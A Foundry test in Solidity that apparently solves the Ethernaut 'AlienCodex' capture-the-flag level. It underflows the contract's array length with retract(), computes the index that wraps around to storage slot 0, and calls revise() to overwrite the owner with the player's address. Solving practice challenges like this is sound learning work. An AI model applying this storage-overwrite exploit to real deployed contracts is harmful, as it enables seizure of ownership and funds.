// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Tests} from "../core/Tests.sol";

contract TestAlienCodex is Tests {
    function test_solve() external {
        // ======= Contract deployment ===================
        // Don't forget to allow the file reading in `foundry.toml`
        bytes memory bytecode = abi.encodePacked(vm.getCode("./src/levels/19_AlienCodex/AlienCodex.json"));
        address alienCodex;
        assembly {
            alienCodex := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        // ==========================

        vm.startPrank(PLAYER);

        alienCodex.call(abi.encodeWithSignature("makeContact()"));
        alienCodex.call(abi.encodeWithSignature("retract()")); // `codex` [] covers the whole contract's storage
        uint256 codexIndexForSlotZero = ((2 ** 256) - 1) - uint256(keccak256(abi.encode(1))) + 1;
        bytes32 leftPaddedAddress = bytes32(abi.encode(PLAYER));
        alienCodex.call(abi.encodeWithSignature("revise(uint256,bytes32)", codexIndexForSlotZero, leftPaddedAddress));

        // ======= Verify result ===================
        (bool ok, bytes memory data) = alienCodex.call(abi.encodeWithSignature("owner()"));
        address refinedData = address(uint160(bytes20(uint160(uint256(bytes32(data)) << 0))));
        assertEq(refinedData, PLAYER);

        vm.stopPrank();
        // ==========================
    }
}
